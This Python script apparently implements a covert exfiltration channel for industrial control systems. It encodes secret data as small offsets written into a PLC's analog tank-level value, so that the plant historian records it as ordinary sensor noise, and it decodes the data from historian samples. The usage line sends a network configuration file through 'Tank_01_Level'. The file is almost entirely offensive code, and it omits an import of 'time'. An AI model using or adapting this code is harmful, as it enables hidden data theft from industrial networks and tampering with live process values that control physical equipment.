# process_variable_steganography.py - Encode data in sensor readings
import random

class ProcessVariableSteganography:
    def __init__(self, plc_controller):
        self.plc = plc_controller

    def encode_data_in_noise(self, secret_data, process_variable):
        """
        Encode data in least significant bits of analog process values
        Example: Tank level sensor with ±0.1% noise
        Use noise band to transmit data
        """
        # Read current process value (e.g., tank level = 75.3%)
        current_value = self.plc.read_analog(process_variable)

        # Convert secret data to binary
        secret_binary = ''.join(format(ord(c), '08b') for c in secret_data)

        # Encode in LSBs (modify value within noise tolerance)
        for bit in secret_binary:
            # Add or subtract small value based on bit
            if bit == '1':
                current_value += 0.05  # +0.05% (within ±0.1% noise)
            else:
                current_value -= 0.05  # -0.05%

            # Write modified value to PLC
            self.plc.write_analog(process_variable, current_value)

            # Wait for historian to collect sample
            time.sleep(1)  # 1 Hz sampling rate

        print(f"[+] Encoded {len(secret_data)} bytes in process variable {process_variable}")

    def decode_data_from_historian(self, historian_samples):
        """
        Extract hidden data from historian time-series
        Analyst sees "normal" process fluctuations
        """
        secret_binary = ""

        for i in range(1, len(historian_samples)):
            delta = historian_samples[i] - historian_samples[i-1]

            if delta > 0.03:  # Positive change -> bit '1'
                secret_binary += '1'
            elif delta < -0.03:  # Negative change -> bit '0'
                secret_binary += '0'

        # Convert binary to ASCII
        secret_data = ""
        for i in range(0, len(secret_binary), 8):
            byte = secret_binary[i:i+8]
            if len(byte) == 8:
                secret_data += chr(int(byte, 2))

        return secret_data

# Usage: Exfiltrate configuration file via tank level sensor
stego = ProcessVariableSteganography(plc_connection)
secret = open('network_config.txt', 'r').read()
stego.encode_data_in_noise(secret, process_variable='Tank_01_Level')
